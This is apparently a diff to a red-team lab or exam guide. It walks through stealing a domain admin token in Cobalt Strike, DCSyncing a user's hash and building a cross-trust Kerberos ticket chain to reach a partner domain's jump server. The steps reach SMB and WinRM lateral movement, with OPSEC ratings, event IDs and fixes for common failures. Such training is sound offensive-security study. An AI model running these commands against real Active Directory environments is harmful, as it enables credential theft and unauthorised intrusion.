@@ -254,85 +254,156 @@ We have DA on CONTOSO. rsteel (a CONTOSO user) has local admin on all PARTNER ma
 **Account we are targeting:** `rsteel` — a CONTOSO domain user, member of "Partner Jump Users"
 **Target machine:** `par-jmp-1.partner.com` — a jump server in PARTNER where rsteel has local admin
 
+> **Exam tip — read before running anything:**
+> DCSync requires DA rights. `steal_token` MUST happen before `dcsync` or it will fail with `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`. Running DCSync as `NT AUTHORITY\SYSTEM` on a workstation does NOT work — SYSTEM is a local identity with no AD replication rights.
+> `kerberos_ticket_use` MUST be called before any network command that needs the injected ticket. `krb_asktgt`/`krb_asktgs` obtain tickets but the beacon's SMB/WinRM stack will not use them until `kerberos_ticket_use` wires the `.kirbi` into the active Kerberos session.
+
 ---
 
-1. Use the high-integrity Beacon to impersonate a domain admin (`dyork`).
+1. **OPSEC-🟢SAFE** — Steal a DA token on the high-integrity Beacon.
 
-    > We need DA to run DCSync. The medium-integrity beacon runs as a regular user. Find a process owned by `dyork` in the process browser and steal the token — this impersonates dyork's security context in-beacon with no process spawn.
-
-2. DCSync *rsteel*'s AES256 hash from CONTOSO.
-
-    ```Beacon-nocolor
-    dcsync contoso.com CONTOSO\rsteel
+    ```cs
+    beacon> process_browser                    // find a process owned by dyork
+    beacon> steal_token <dyork-pid>            // impersonate CONTOSO\dyork in-process, no spawn
     ```
 
-    > **Why rsteel, not Administrator?** We need to authenticate to PARTNER **as rsteel** because rsteel is the account that is a member of "Partner Jump Users." Using the Administrator account would still work IF Administrator were also in "Partner Jump Users" — but rsteel is the designated bridge account here. We DCSync rsteel's hash because we need it to mint a legitimate TGT. Note the `aes256_hmac` value from the output — this is what gets passed to `krb_asktgt` next.
+    > Duplicates dyork's token into the beacon process. No child process, no Event 4688. This is the only way to DCSync — you need a token with `DS-Replication-Get-Changes-All` rights on the domain, which DA accounts have. `NT AUTHORITY\SYSTEM` on a workstation does not have this right.
     >
-    > **OPSEC-CAUTION** — DCSync generates Event 4662 on the DC. Use the AES256 hash, not RC4/NT — AES256 requests are less anomalous.
+    > ⚠️ **Exam trap:** If you skip this step and run `dcsync` while the beacon token is SYSTEM, you get `ERROR_DS_DRA_ACCESS_DENIED (0x20f7)`. The DCSync silently fails and you have no hash to continue with.
 
-3. Obtain a TGT for *rsteel* from CONTOSO's KDC.
+2. **OPSEC-🟠CAUTION** — DCSync *rsteel*'s AES256 hash.
 
-    ```Beacon-nocolor
-    krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
+    ```cs
+    beacon> dcsync contoso.com CONTOSO\rsteel
     ```
 
-    > **What happens here:** An AS-REQ is sent to CONTOSO's KDC using rsteel's AES256 hash as the pre-authentication key. CONTOSO's KDC issues a TGT for `rsteel@CONTOSO.COM`. This TGT is encrypted with CONTOSO's `krbtgt` key — only CONTOSO's KDC can read it.
+    > **Why rsteel, not Administrator?** rsteel is the bridge account — member of "Partner Jump Users" which maps via FSP to PARTNER local admin. DCSync with dyork's token generates Event 4662 on the DC. Use the `aes256_hmac` value only — AES256 is normal pre-auth behaviour and less anomalous than RC4.
     >
-    > **Ticket in hand:** `TGT_rsteel` — valid for CONTOSO only. Proves to CONTOSO KDC: "I am rsteel."
-    >
-    > **OPSEC-CAUTION** — Generates Event 4768 (AS-REQ) on CONTOSO DC. AES256 pre-auth is normal Kerberos behaviour.
-    >
-    > Note the base64 ticket from the output — this is `[TGT]` referenced in the next command.
+    > Event log: **4662** on `lon-dc-1` — Directory Service access, Properties: `DS-Replication-Get-Changes-All`
 
-4. Use the TGT to request an inter-realm referral ticket.
+3. **OPSEC-🟠CAUTION** — Request a TGT for *rsteel* from CONTOSO's KDC.
 
-    ```Beacon-nocolor
-    krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
+    ```cs
+    beacon> krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
     ```
 
-    > **What happens here:** A TGS-REQ is sent to CONTOSO's KDC, presenting `TGT_rsteel` and asking for a ticket to access `krbtgt/partner.com`. Requesting the `krbtgt` service of a foreign realm is how Kerberos signals a cross-realm referral.
+    > AS-REQ sent to CONTOSO's KDC using rsteel's AES256 hash as pre-auth. KDC returns a TGT for `rsteel@CONTOSO.COM` encrypted with CONTOSO's `krbtgt` key.
     >
-    > CONTOSO's KDC checks: "Do I have an inbound trust with partner.com? Yes." It issues a cross-realm TGT (also called a referral ticket or inter-realm ticket), encrypted with the **inter-realm trust key** — a secret shared between CONTOSO's KDC and PARTNER's KDC, derived from the trust password they both hold.
+    > **Ticket in hand:** `TGT_rsteel` — valid for CONTOSO only.
     >
-    > **Ticket in hand:** `INTER-REALM TGT` — encrypted with the trust key. Contains rsteel's identity and group SIDs, including the "Partner Jump Users" SID (S-1-5-21-3926355307-...-6102). ONLY PARTNER's KDC can decrypt this (it knows the inter-realm key too).
+    > **Save the base64 output** — you need it for step 4 AND to decode to `rsteel_tgt.kirbi` for step 7.
     >
-    > **OPSEC-CAUTION** — Generates Event 4769 (TGS-REQ for krbtgt/partner.com) on CONTOSO DC. This is unusual traffic — normal users don't typically request cross-realm referrals directly.
-    >
-    > Note the base64 inter-realm ticket — this is `[INTER-REALM]` referenced in the next command.
+    > Event log: **4768** (AS-REQ) on `lon-dc-1`
 
-5. Use the inter-realm ticket to request a service ticket for CIFS on *par-jmp-1*.
+4. **OPSEC-🟠CAUTION** — Request an inter-realm referral ticket.
 
-    ```Beacon-nocolor
-    krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
+    ```cs
+    beacon> krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
     ```
 
-    > **What happens here:** A TGS-REQ is now sent to **PARTNER's KDC** (`/dc:par-dc-1.partner.com` — note we explicitly point at PARTNER's DC, not our own), presenting the inter-realm TGT and asking for a service ticket to `cifs/par-jmp-1.partner.com`.
+    > TGS-REQ to CONTOSO's KDC for service `krbtgt/partner.com`. Requesting the `krbtgt` of a foreign realm signals a cross-realm referral. CONTOSO's KDC sees the inbound trust with PARTNER and issues a cross-realm TGT encrypted with the **inter-realm trust key** — shared between both KDCs, derived from the trust password.
     >
-    > PARTNER's KDC:
-    > 1. Decrypts the inter-realm TGT using the trust key — validates it came from CONTOSO
-    > 2. Reads rsteel's SIDs from the PAC — sees SID `-6102` (Partner Jump Users)
-    > 3. Looks up FSP: `-6102` maps to FSP → member of "Contoso Users" (SID `-1104`)
-    > 4. Adds "Contoso Users" SID to rsteel's PAC in the new ticket
-    > 5. Issues a service ticket for `cifs/par-jmp-1.partner.com`, encrypted with par-jmp-1's machine account key
+    > **Ticket in hand:** `INTER-REALM TGT` — only PARTNER's KDC can decrypt this. Contains rsteel's SIDs including "Partner Jump Users" (-6102).
     >
-    > `/targetdomain:partner.com` tells the command which realm the service lives in.
-    > `/dc:par-dc-1.partner.com` is required — we must send this TGS-REQ to PARTNER's KDC, not CONTOSO's.
+    > **Save the base64 output** — used in steps 5 and 5b.
     >
-    > **Ticket in hand:** `SERVICE TICKET` for cifs/par-jmp-1 — encrypted with par-jmp-1's key. PAC inside contains "Contoso Users" (-1104) which GPO maps to local admin.
-    >
-    > **OPSEC-CAUTION** — Generates Event 4769 (TGS-REQ) on PARTNER's DC (`par-dc-1`). This is the first event generated on PARTNER's infrastructure.
+    > Event log: **4769** (TGS-REQ for `krbtgt/partner.com`) on `lon-dc-1` — unusual, normal users don't request cross-realm referrals directly.
 
-6. Use the service ticket to access the service in the trusting domain.
+5. **OPSEC-🟠CAUTION** — Request a CIFS service ticket for *par-jmp-1* from PARTNER's KDC.
 
-    ```Beacon-nocolor
-    ls \\par-jmp-1.partner.com\c$
+    ```cs
+    beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
     ```
 
-    > The service ticket is presented to `par-jmp-1` over SMB. par-jmp-1 decrypts the ticket with its own machine account key, reads the PAC, sees "Contoso Users" (-1104) in the group list, maps that to local Administrators via the applied GPO, and grants access.
+    > TGS-REQ sent to **PARTNER's KDC** (`/dc:par-dc-1.partner.com` — critical, must point at PARTNER, not CONTOSO). PARTNER's KDC:
+    > 1. Decrypts inter-realm TGT with the trust key → validates it came from CONTOSO
+    > 2. Reads rsteel's PAC → sees `-6102` (Partner Jump Users)
+    > 3. Resolves FSP: `-6102` → member of "Contoso Users" (`-1104`)
+    > 4. Adds `-1104` to rsteel's PAC in the new ticket
+    > 5. Issues CIFS service ticket encrypted with par-jmp-1's machine account key
     >
-    > **OPSEC-SAFE** — Generates Event 4624 Type 3 (network logon) on par-jmp-1. Looks like a normal admin SMB access. No lateral movement artifact, no service creation, no process on the remote host.
+    > **Ticket in hand:** `SERVICE TICKET` for `cifs/par-jmp-1.partner.com` — PAC contains `-1104` which GPO maps to local Administrators.
+    >
+    > **Save the base64 output** — decode to `rsteel_cifs.kirbi`.
+    >
+    > Event log: **4769** on `par-dc-1` — first event generated on PARTNER infrastructure.
 
-⚠️ In this lab, you have taken advantage of legit access assigned across a one-way inbound trust.
+5b. **OPSEC-🟠CAUTION** — Also request an HTTP service ticket for WinRM lateral movement.
+
+    ```cs
+    beacon> krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
+    ```
+
+    > `jump winrm64` authenticates over WinRM using the **`http` SPN**, not `cifs`. If you only inject the CIFS ticket and then run `jump winrm64`, you get error `0x8009030e` — "A specified logon session does not exist" — because Kerberos cannot find a ticket for `http/par-jmp-1.partner.com` in the session.
+    >
+    > **Same inter-realm ticket is reused** — no extra DCSync or TGT needed, just a second `krb_asktgs` call with `http` instead of `cifs`.
+    >
+    > **Save the base64 output** — decode to `rsteel_http.kirbi`.
+    >
+    > Event log: **4769** on `par-dc-1`
+
+6. **OPSEC-🟢SAFE** — Decode the `.kirbi` files on the attacker desktop.
+
+    ```powershell
+    # Run on attacker Windows desktop (not in beacon) — CyberChef or PowerShell:
+    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi",
+      [System.Convert]::FromBase64String("<base64-from-step-5>"))
+
+    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi",
+      [System.Convert]::FromBase64String("<base64-from-step-5b>"))
+
+    [System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_tgt.kirbi",
+      [System.Convert]::FromBase64String("<base64-from-step-3>"))
+    ```
+
+    > Local file operation — no Kerberos events, no network traffic.
+
+7. **OPSEC-🟢SAFE** — Inject the CIFS ticket and verify.
+
+    ```cs
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
+    beacon> run klist
+    ```
+
+    > `kerberos_ticket_use` wires the `.kirbi` into the beacon's active Kerberos logon session. Without this step, the beacon's SMB stack uses its existing token identity (SYSTEM or low-priv user) and ignores the Kerbeus-obtained ticket entirely.
+    >
+    > Verify `klist` output shows: `Server: cifs/par-jmp-1.partner.com @ PARTNER.COM`
+    > The `@ PARTNER.COM` confirms the ticket was issued by PARTNER's KDC, not CONTOSO's.
+    >
+    > ⚠️ **Exam trap:** Skipping `kerberos_ticket_use` and going straight to `ls` will give `ERROR_ACCESS_DENIED (5)` even though `krb_asktgs` returned a valid ticket.
+
+8. **OPSEC-🟢SAFE** — Access C$ on *par-jmp-1* via SMB.
+
+    ```cs
+    beacon> ls \\par-jmp-1.partner.com\c$
+    ```
+
+    > Service ticket is presented to par-jmp-1 over SMB. par-jmp-1 decrypts with its machine account key, reads the PAC, sees "Contoso Users" (-1104), maps to local Administrators via GPO — access granted.
+    >
+    > Event log: **4624 Type 3** (network logon) on `par-jmp-1` — normal admin SMB, no lateral movement artefact.
+
+9. **OPSEC-🟢SAFE** — Lateral move to *par-jmp-1* via WinRM.
+
+    ```cs
+    beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi
+    beacon> run klist                           // verify: http/par-jmp-1.partner.com @ PARTNER.COM
+    beacon> jump winrm64 par-jmp-1.partner.com smb
+    ```
+
+    > Inject the HTTP ticket, then `jump winrm64`. WinRM authentication uses the `http` SPN — this ticket gives Kerberos auth across the trust boundary. CS injects a beacon into `wsmprovhost.exe` on par-jmp-1 and connects back over the SMB listener named pipe.
+    >
+    > ⚠️ **Exam trap:** If you only injected the CIFS ticket and run `jump winrm64`, you get `0x8009030e` — logon session error. You need BOTH tickets: `cifs` for `ls`/`download`, `http` for `jump winrm64`.
+    >
+    > Event log: **4624 Type 3** on `par-jmp-1` — WinRM network logon from rsteel. No service created, no Event 7045.
+
+10. **Cleanup** — OPSEC-🟢SAFE.
+
+    ```cs
+    beacon> kerberos_ticket_purge               // remove all injected tickets from session
+    beacon> rev2self                            // drop dyork impersonation token
+    ```
+
+⚠️ In this lab, you have taken advantage of legit access assigned across a one-way inbound trust. The entire chain — DCSync → 3-ticket Kerberos referral → SMB access → WinRM lateral move — generates events only in CONTOSO (4662, 4768, 4769) and one network logon event on par-jmp-1. No process creation, no service installation, no disk writes on the target.
 
 ===
 
@@ -351,11 +422,34 @@ trustAttributes=32          → TREAT_AS_EXTERNAL → SID filtering partially re
 
 ### Ticket Chain for Cross-Trust Access
 ```
-1. DCSync target user hash (need DA on source domain)
-2. krb_asktgt           → TGT (source domain KDC)          → encrypted with source krbtgt
-3. krb_asktgs krbtgt/foreign.domain  → INTER-REALM TGT     → encrypted with trust key
-4. krb_asktgs cifs/target /dc:foreign-dc → SERVICE TICKET  → encrypted with target machine key
-5. ls / download        → present service ticket over SMB   → access granted
+0. steal_token <DA-pid>                                                      OPSEC-🟢SAFE   PREREQUISITE
+1. dcsync <domain> <DOMAIN\user>                                             OPSEC-🟠CAUTION Event 4662 on source DC
+2. krb_asktgt /user:<user> /aes256:<hash>         → TGT                     OPSEC-🟠CAUTION Event 4768 on source DC
+3. krb_asktgs /service:krbtgt/foreign.domain      → INTER-REALM TGT         OPSEC-🟠CAUTION Event 4769 on source DC
+4. krb_asktgs /service:cifs/target /dc:foreign-dc → CIFS SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
+4b.krb_asktgs /service:http/target /dc:foreign-dc → HTTP SERVICE TICKET     OPSEC-🟠CAUTION Event 4769 on foreign DC
+5. [decode base64 → .kirbi on attacker desktop]                              OPSEC-🟢SAFE   local only
+6. kerberos_ticket_use <cifs.kirbi>               → inject CIFS ticket       OPSEC-🟢SAFE   REQUIRED before ls
+7. ls \\target\c$                                 → SMB access confirmed     OPSEC-🟢SAFE   Event 4624 T3 on target
+8. kerberos_ticket_use <http.kirbi>               → inject HTTP ticket       OPSEC-🟢SAFE   REQUIRED before winrm
+9. jump winrm64 target smb                        → beacon in wsmprovhost    OPSEC-🟢SAFE   Event 4624 T3 on target
+10.kerberos_ticket_purge + rev2self               → cleanup                  OPSEC-🟢SAFE
+```
+
+### Common Failures and Fixes
+```
+ERROR_DS_DRA_ACCESS_DENIED (0x20f7) on dcsync
+  → You skipped steal_token. SYSTEM on a workstation ≠ DA rights.
+  → Fix: process_browser → steal_token <DA-pid> → retry dcsync
+
+ERROR_ACCESS_DENIED (5) on ls after krb_asktgs
+  → You skipped kerberos_ticket_use. The ticket was obtained but not wired in.
+  → Fix: decode base64 → .kirbi → kerberos_ticket_use <cifs.kirbi> → retry ls
+
+0x8009030e logon session error on jump winrm64
+  → You only injected the CIFS ticket. WinRM uses http SPN, not cifs.
+  → Fix: krb_asktgs http/target + kerberos_ticket_use <http.kirbi> → retry jump winrm64
+  → Also check: klist should show http/target @ FOREIGN.DOMAIN before jump
 ```
 
 ### SID Identification by Domain Prefix
